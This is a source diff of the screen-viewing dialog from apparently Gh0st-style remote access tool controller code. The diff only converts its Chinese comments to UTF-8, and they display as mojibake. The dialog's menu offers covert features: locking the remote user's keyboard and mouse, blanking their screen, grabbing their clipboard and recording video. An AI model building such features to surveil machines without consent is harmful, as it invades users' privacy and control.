@@ -1,4 +1,4 @@
-// ScreenSpyDlg.cpp : implementation file
+ï»¿// ScreenSpyDlg.cpp : implementation file
 //
 
 #include "stdafx.h"
@@ -16,22 +16,22 @@ enum
 {
 	IDM_SET_FLUSH = 0x0010,
 	IDM_CONTROL,
-	IDM_TRACE_CURSOR,	// ¸ú×ÙÏÔÊ¾Ô¶³ÌÊó±ê
-	IDM_BLOCK_INPUT,	// Ëø¶¨Ô¶³Ì¼ÆËã»úÊäÈë
-	IDM_BLANK_SCREEN,	// ºÚÆÁ
-	IDM_CAPTURE_LAYER,	// ²¶×½²ã
-	IDM_SAVEDIB,		// ±£´æÍ¼Æ¬
-	IDM_SAVEAVI_S,      // ±£´æÂ¼Ïñ
-	IDM_GET_CLIPBOARD,	// »ñÈ¡¼ôÌù°å
-	IDM_SET_CLIPBOARD,	// ÉèÖÃ¼ôÌù°å
+	IDM_TRACE_CURSOR,	// è·Ÿè¸ªæ˜¾ç¤ºè¿œç¨‹é¼ æ ‡
+	IDM_BLOCK_INPUT,	// é”å®šè¿œç¨‹è®¡ç®—æœºè¾“å…¥
+	IDM_BLANK_SCREEN,	// é»‘å±
+	IDM_CAPTURE_LAYER,	// æ•æ‰å±‚
+	IDM_SAVEDIB,		// ä¿å­˜å›¾ç‰‡
+	IDM_SAVEAVI_S,      // ä¿å­˜å½•åƒ
+	IDM_GET_CLIPBOARD,	// è·å–å‰ªè´´æ¿
+	IDM_SET_CLIPBOARD,	// è®¾ç½®å‰ªè´´æ¿
 
 	IDM_DEEP_16,
 	IDM_DEEP_24,
 	IDM_DEEP_32,
 
-	IDM_QUALITY60,		// ÇåÎú¶ÈµÍ
-	IDM_QUALITY85,		// ÇåÎú¶ÈÖĞ
-	IDM_QUALITY100,		// ÇåÎú¶È¸ß
+	IDM_QUALITY60,		// æ¸…æ™°åº¦ä½
+	IDM_QUALITY85,		// æ¸…æ™°åº¦ä¸­
+	IDM_QUALITY100,		// æ¸…æ™°åº¦é«˜
 
 	IDM_FPS_1,
 	IDM_FPS_5,
@@ -53,7 +53,7 @@ CQuickScreenSpyDlg::CQuickScreenSpyDlg(CWnd* pParent, ISocketBase* pIOCPServer, 
 
 	m_iocpServer = pIOCPServer;
 	m_pContext = pContext;
-	m_bIsFirst = true; // Èç¹ûÊÇµÚÒ»´Î´ò¿ª¶Ô»°¿ò£¬ÏÔÊ¾ÌáÊ¾µÈ´ıĞÅÏ¢
+	m_bIsFirst = true; // å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡æ‰“å¼€å¯¹è¯æ¡†ï¼Œæ˜¾ç¤ºæç¤ºç­‰å¾…ä¿¡æ¯
 	m_lpScreenDIB = NULL;
 	m_lpvRectBits = NULL;
 	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SCREENSYP));
@@ -63,7 +63,7 @@ CQuickScreenSpyDlg::CQuickScreenSpyDlg(CWnd* pParent, ISocketBase* pIOCPServer, 
 	m_lpbmi_rect = (BITMAPINFO*) new BYTE[nBISize];
 	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
 	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
-	m_bIsCtrl = false; // Ä¬ÈÏ²»¿ØÖÆ
+	m_bIsCtrl = false; // é»˜è®¤ä¸æ§åˆ¶
 	m_bCursorIndex = 1;
 	m_bOnClose = FALSE;
 	m_MYtagMSG = new MYtagMSG;
@@ -214,7 +214,7 @@ void CQuickScreenSpyDlg::OnReceive()
 		return;
 	if (m_bOnClose) 	return;
 	CString str;
-	str.Format(_T("¸ßËÙÆÁÄ»¼à¿Ø \\\\ %s %d * %d µÚ%dÖ¡  [ÊÕ°ü:%d ÊÕ:%d KB] [·¢°ü:%d ·¢:%d KB]"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, m_nCount, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
+	str.Format(_T("é«˜é€Ÿå±å¹•ç›‘æ§ \\\\ %s %d * %d ç¬¬%då¸§  [æ”¶åŒ…:%d æ”¶:%d KB] [å‘åŒ…:%d å‘:%d KB]"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, m_nCount, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
 
 	SetWindowText(str);
 }
@@ -224,7 +224,7 @@ void CQuickScreenSpyDlg::OnReceive()
 bool CQuickScreenSpyDlg::SaveSnapshot()
 {
 	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
-	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("Î»Í¼ÎÄ¼ş(*.bmp)|*.bmp|"), this);
+	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("ä½å›¾æ–‡ä»¶(*.bmp)|*.bmp|"), this);
 	if (dlg.DoModal() != IDOK)
 		return false;
 
@@ -233,10 +233,10 @@ bool CQuickScreenSpyDlg::SaveSnapshot()
 	CFile	file;
 	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
 	{
-		MessageBox(_T("ÎÄ¼ş±£´æÊ§°Ü"));
+		MessageBox(_T("æ–‡ä»¶ä¿å­˜å¤±è´¥"));
 		return false;
 	}
-	// BITMAPINFO´óĞ¡
+	// BITMAPINFOå¤§å°
 	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
 	// Fill in the fields of the file header
 	hdr.bfType = ((WORD)('M' << 8) | 'B');	// is always "BM"
@@ -283,21 +283,21 @@ BOOL CQuickScreenSpyDlg::OnInitDialog()
 	if (pSysMenu != NULL)
 	{
 		pSysMenu->AppendMenu(MF_SEPARATOR);
-		pSysMenu->AppendMenu(MF_STRING, IDM_SET_FLUSH, _T("Ë¢ĞÂ(&F)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, _T("¿ØÖÆÆÁÄ»(&Y)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, _T("¸ú×Ù·şÎñ¶ËÊó±ê(&T)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, _T("Ëø¶¨·şÎñ¶ËÊó±êºÍ¼üÅÌ(&L)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, _T("·şÎñ¶ËºÚÆÁ(&B)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, _T("²¶×½²ã(µ¼ÖÂÊó±êÉÁË¸)(&L)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("±£´æ¿ìÕÕ(&S)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI_S, _T("±£´æÂ¼Ïñ¡ª±ØĞë°²×°XvidÂ¼ÖÆÊÓÆµ½âÂëÆ÷(&A)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_SET_FLUSH, _T("åˆ·æ–°(&F)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, _T("æ§åˆ¶å±å¹•(&Y)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, _T("è·Ÿè¸ªæœåŠ¡ç«¯é¼ æ ‡(&T)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, _T("é”å®šæœåŠ¡ç«¯é¼ æ ‡å’Œé”®ç›˜(&L)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, _T("æœåŠ¡ç«¯é»‘å±(&B)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, _T("æ•æ‰å±‚(å¯¼è‡´é¼ æ ‡é—ªçƒ)(&L)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("ä¿å­˜å¿«ç…§(&S)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI_S, _T("ä¿å­˜å½•åƒâ€”å¿…é¡»å®‰è£…Xvidå½•åˆ¶è§†é¢‘è§£ç å™¨(&A)"));
 		pSysMenu->AppendMenu(MF_SEPARATOR);
-		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, _T("»ñÈ¡¼ôÌù°å(&R)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, _T("ÉèÖÃ¼ôÌù°å(&L)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, _T("è·å–å‰ªè´´æ¿(&R)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, _T("è®¾ç½®å‰ªè´´æ¿(&L)"));
 		pSysMenu->AppendMenu(MF_SEPARATOR);
-		pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY60, _T("ÇåÎú¶ÈµÍ60/100"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY85, _T("ÇåÎú¶ÈÖĞ85/100"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY100, _T("ÇåÎú¶È¸ß100/100"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY60, _T("æ¸…æ™°åº¦ä½60/100"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY85, _T("æ¸…æ™°åº¦ä¸­85/100"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY100, _T("æ¸…æ™°åº¦é«˜100/100"));
 		pSysMenu->AppendMenu(MF_SEPARATOR);
 
 
@@ -327,7 +327,7 @@ BOOL CQuickScreenSpyDlg::OnInitDialog()
 	m_RemoteCursorPos.x = 0;
 	m_RemoteCursorPos.x = 0;
 	m_bIsTraceCursor = false;
-	// ³õÊ¼»¯´°¿Ú´óĞ¡½á¹¹
+	// åˆå§‹åŒ–çª—å£å¤§å°ç»“æ„
 	m_hDC = ::GetDC(m_hWnd);
 	m_hMemDC = CreateCompatibleDC(m_hDC);
 	SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
@@ -406,14 +406,14 @@ void CQuickScreenSpyDlg::DrawFirstScreen(PBYTE pDeCompressionData, unsigned long
 
 void CQuickScreenSpyDlg::DrawNextScreenHome(PBYTE pDeCompressionData, unsigned long	destLen)
 {
-	// ¸ù¾İÊó±êÊÇ·ñÒÆ¶¯ºÍÆÁÄ»ÊÇ·ñ±ä»¯ÅĞ¶ÏÊÇ·ñÖØ»æÊó±ê, ·ÀÖ¹Êó±êÉÁË¸
+	// æ ¹æ®é¼ æ ‡æ˜¯å¦ç§»åŠ¨å’Œå±å¹•æ˜¯å¦å˜åŒ–åˆ¤æ–­æ˜¯å¦é‡ç»˜é¼ æ ‡, é˜²æ­¢é¼ æ ‡é—ªçƒ
 	bool	bIsReDraw = false;
-	int		nHeadLength = 1 + sizeof(POINT) + sizeof(BYTE); //  Ëã·¨[1] + ¹â±êÎ»ÖÃ[8] + ¹â±êÀàĞÍË÷Òı[1]
+	int		nHeadLength = 1 + sizeof(POINT) + sizeof(BYTE); //  ç®—æ³•[1] + å…‰æ ‡ä½ç½®[8] + å…‰æ ‡ç±»å‹ç´¢å¼•[1]
 	LPVOID	lpNextScreen = pDeCompressionData + nHeadLength;
 	DWORD	dwNextLength = destLen - nHeadLength;
 	DWORD	dwNextOffset = 0;
 
-	// ÅĞ¶ÏÊó±êÊÇ·ñÒÆ¶¯
+	// åˆ¤æ–­é¼ æ ‡æ˜¯å¦ç§»åŠ¨
 	LPPOINT	lpNextCursorPos = (LPPOINT)(pDeCompressionData + 1);
 	if (memcmp(lpNextCursorPos, &m_RemoteCursorPos, sizeof(POINT)) != 0 && m_bIsTraceCursor)
 	{
@@ -421,8 +421,8 @@ void CQuickScreenSpyDlg::DrawNextScreenHome(PBYTE pDeCompressionData, unsigned l
 		memcpy(&m_RemoteCursorPos, lpNextCursorPos, sizeof(POINT));
 	}
 
-	// ¹â±êÀàĞÍ·¢Éú±ä»¯
-// ¹â±êÀàĞÍ·¢Éú±ä»¯
+	// å…‰æ ‡ç±»å‹å‘ç”Ÿå˜åŒ–
+// å…‰æ ‡ç±»å‹å‘ç”Ÿå˜åŒ–
 	int	nOldCursorIndex = m_bCursorIndex;
 	LPBYTE lpNextCursorIndex = (LPBYTE)(pDeCompressionData + 9);
 	if (*lpNextCursorIndex != m_bCursorIndex)
@@ -433,7 +433,7 @@ void CQuickScreenSpyDlg::DrawNextScreenHome(PBYTE pDeCompressionData, unsigned l
 		if (m_bIsCtrl && !m_bIsTraceCursor)
 			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
 	}
-	// ÆÁÄ»Êı¾İÊÇ·ñ±ä»¯
+	// å±å¹•æ•°æ®æ˜¯å¦å˜åŒ–
 	while (dwNextOffset < dwNextLength)
 	{
 		int* pinlen = (int*)((LPBYTE)lpNextScreen + dwNextOffset);
@@ -499,9 +499,9 @@ void  CQuickScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 	case SC_MAXIMIZE:
 		OnNcLButtonDblClk(HTCAPTION, NULL);
 		return;
-	case SC_MONITORPOWER: // À¹½ØÏÔÊ¾Æ÷½Úµç×Ô¶¯¹Ø±ÕµÄÏûÏ¢
+	case SC_MONITORPOWER: // æ‹¦æˆªæ˜¾ç¤ºå™¨èŠ‚ç”µè‡ªåŠ¨å…³é—­çš„æ¶ˆæ¯
 		return;
-	case SC_SCREENSAVE:   // À¹½ØÆÁÄ»±£»¤Æô¶¯µÄÏûÏ¢
+	case SC_SCREENSAVE:   // æ‹¦æˆªå±å¹•ä¿æŠ¤å¯åŠ¨çš„æ¶ˆæ¯
 		return;
 	case IDM_SET_FLUSH:
 	{
@@ -525,7 +525,7 @@ void  CQuickScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
 	}
 	break;
-	case IDM_TRACE_CURSOR: // ¸ú×Ù·şÎñ¶ËÊó±ê
+	case IDM_TRACE_CURSOR: // è·Ÿè¸ªæœåŠ¡ç«¯é¼ æ ‡
 	{
 		m_bIsTraceCursor = !m_bIsTraceCursor;
 		pSysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);
@@ -536,11 +536,11 @@ void  CQuickScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 			else
 				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
 		}
-		// ÖØ»æÏû³ı»òÏÔÊ¾Êó±ê
+		// é‡ç»˜æ¶ˆé™¤æˆ–æ˜¾ç¤ºé¼ æ ‡
 		PostMessage(WM_PAINT);
 	}
 	break;
-	case IDM_BLOCK_INPUT: // Ëø¶¨·şÎñ¶ËÊó±êºÍ¼üÅÌ
+	case IDM_BLOCK_INPUT: // é”å®šæœåŠ¡ç«¯é¼ æ ‡å’Œé”®ç›˜
 	{
 		bool bIsChecked = (pSysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED) ? true : false;
 		pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
@@ -551,7 +551,7 @@ void  CQuickScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
 	}
 	break;
-	case IDM_BLANK_SCREEN: // ·şÎñ¶ËºÚÆÁ
+	case IDM_BLANK_SCREEN: // æœåŠ¡ç«¯é»‘å±
 	{
 		bool bIsChecked = (pSysMenu->GetMenuState(IDM_BLANK_SCREEN, MF_BYCOMMAND) & MF_CHECKED) ? true : false;
 		pSysMenu->CheckMenuItem(IDM_BLANK_SCREEN, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
@@ -562,7 +562,7 @@ void  CQuickScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
 	}
 	break;
-	case IDM_CAPTURE_LAYER: // ²¶×½²ã
+	case IDM_CAPTURE_LAYER: // æ•æ‰å±‚
 	{
 		bool bIsChecked = (pSysMenu->GetMenuState(IDM_CAPTURE_LAYER, MF_BYCOMMAND) & MF_CHECKED) ? true : false;
 		pSysMenu->CheckMenuItem(IDM_CAPTURE_LAYER, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
@@ -591,7 +591,7 @@ void  CQuickScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 
 		if (m_lpbmi->bmiHeader.biBitCount <= 15)
 		{
-			AfxMessageBox(_T("²»Ö§³Ö16Î»¼°ÒÔÏÂÑÕÉ«Â¼Ïñ"));
+			AfxMessageBox(_T("ä¸æ”¯æŒ16ä½åŠä»¥ä¸‹é¢œè‰²å½•åƒ"));
 			return;
 		}
 
@@ -617,13 +617,13 @@ void  CQuickScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 
 	}
 	break;
-	case IDM_GET_CLIPBOARD: // »ñÈ¡¼ôÌù°å
+	case IDM_GET_CLIPBOARD: // è·å–å‰ªè´´æ¿
 	{
 		BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD_QUICK;
 		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
 	}
 	break;
-	case IDM_SET_CLIPBOARD: // ÉèÖÃ¼ôÌù°å
+	case IDM_SET_CLIPBOARD: // è®¾ç½®å‰ªè´´æ¿
 	{
 		SendLocalClipboard();
 	}
@@ -645,21 +645,21 @@ void  CQuickScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 		pSysMenu->CheckMenuRadioItem(IDM_DEEP_16, IDM_DEEP_32, IDM_DEEP_32, MF_BYCOMMAND);
 	}
 	break;
-	case IDM_QUALITY60:  // ÇåÎú¶È60
+	case IDM_QUALITY60:  // æ¸…æ™°åº¦60
 	{
 		BYTE	bToken = COMMAND_COMMAND_SCREEN_UALITY60;
 		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
 		pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY60, MF_BYCOMMAND);
 	}
 	break;
-	case IDM_QUALITY85:  // ÇåÎú¶È85
+	case IDM_QUALITY85:  // æ¸…æ™°åº¦85
 	{
 		BYTE	bToken = COMMAND_COMMAND_SCREEN_UALITY85;
 		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
 		pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY85, MF_BYCOMMAND);
 	}
 	break;
-	case IDM_QUALITY100:  // ÇåÎú¶È100
+	case IDM_QUALITY100:  // æ¸…æ™°åº¦100
 	{
 		BYTE	bToken = COMMAND_COMMAND_SCREEN_UALITY100;
 		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
@@ -913,7 +913,7 @@ void CQuickScreenSpyDlg::OnPaint()
 
 	if (m_bIsFirst)
 	{
-		DrawTipString(_T("ÇëÉÔºò - ³õÊ¼ÆÁÄ»¼ÓÔØ"));
+		DrawTipString(_T("è¯·ç¨å€™ - åˆå§‹å±å¹•åŠ è½½"));
 		return;
 	}
 	if (m_bOnClose) return;
@@ -949,7 +949,7 @@ LRESULT CQuickScreenSpyDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lPara
 	// TODO: Add your specialized code here and/or call the base class
 	if (message == WM_POWERBROADCAST && wParam == PBT_APMQUERYSUSPEND)
 	{
-		return BROADCAST_QUERY_DENY; // À¹½ØÏµÍ³´ı»ú, ĞİÃßµÄÇëÇó
+		return BROADCAST_QUERY_DENY; // æ‹¦æˆªç³»ç»Ÿå¾…æœº, ä¼‘çœ çš„è¯·æ±‚
 	}
 	if (message == WM_ACTIVATE && LOWORD(wParam) != WA_INACTIVE && !HIWORD(wParam))
 	{
@@ -969,11 +969,11 @@ void CQuickScreenSpyDlg::OnTimer(UINT nIDEvent)
 {
 	if (!m_aviFile.IsEmpty())
 	{
-		LPCTSTR	lpTipsString = _T("¡ñ");
+		LPCTSTR	lpTipsString = _T("â—");
 
 		m_aviStream.Write(m_lpScreenDIB);
 
-		// ÌáÊ¾ÕıÔÚÂ¼Ïñ
+		// æç¤ºæ­£åœ¨å½•åƒ
 		//SetBkMode(m_hDC, TRANSPARENT);
 		SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
 		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
@@ -987,19 +987,19 @@ bool CQuickScreenSpyDlg::JPG_BMP(int cbit, void* input, int inlen, void* output)
 	struct jpeg_decompress_struct jds;
 	struct jpeg_error_mgr jem;
 
-	// ÉèÖÃ´íÎó´¦Àí
+	// è®¾ç½®é”™è¯¯å¤„ç†
 	jds.err = jpeg_std_error(&jem);
-	// ´´½¨½âÑ¹½á¹¹
+	// åˆ›å»ºè§£å‹ç»“æ„
 	jpeg_create_decompress(&jds);
-	// ÉèÖÃ¶ÁÈ¡(ÊäÈë)Î»ÖÃ
+	// è®¾ç½®è¯»å–(è¾“å…¥)ä½ç½®
 	jpeg_mem_src(&jds, (byte*)input, inlen);
-	// ¶ÁÈ¡Í·²¿ĞÅÏ¢
+	// è¯»å–å¤´éƒ¨ä¿¡æ¯
 	if (jpeg_read_header(&jds, true) != JPEG_HEADER_OK)
 	{
 		jpeg_destroy_decompress(&jds);
 		return false;
 	}
-	// ÉèÖÃÏà¹Ø²ÎÊı
+	// è®¾ç½®ç›¸å…³å‚æ•°
 	switch (cbit)
 	{
 	case 16:
@@ -1015,7 +1015,7 @@ bool CQuickScreenSpyDlg::JPG_BMP(int cbit, void* input, int inlen, void* output)
 		jpeg_destroy_decompress(&jds);
 		return false;
 	}
-	// ¿ªÊ¼½âÑ¹Í¼Ïñ
+	// å¼€å§‹è§£å‹å›¾åƒ
 	if (!jpeg_start_decompress(&jds))
 	{
 		jpeg_destroy_decompress(&jds);
@@ -1027,13 +1027,13 @@ bool CQuickScreenSpyDlg::JPG_BMP(int cbit, void* input, int inlen, void* output)
 		byte* pline = (byte*)output + jds.output_scanline * line_stride;
 		jpeg_read_scanlines(&jds, &pline, 1);
 	}
-	// Íê³ÉÍ¼Ïñ½âÑ¹
+	// å®Œæˆå›¾åƒè§£å‹
 	if (!jpeg_finish_decompress(&jds))
 	{
 		jpeg_destroy_decompress(&jds);
 		return false;
 	}
-	// ÊÍ·ÅÏà¹Ø×ÊÔ´
+	// é‡Šæ”¾ç›¸å…³èµ„æº
 	jpeg_destroy_decompress(&jds);
 
 	return true;
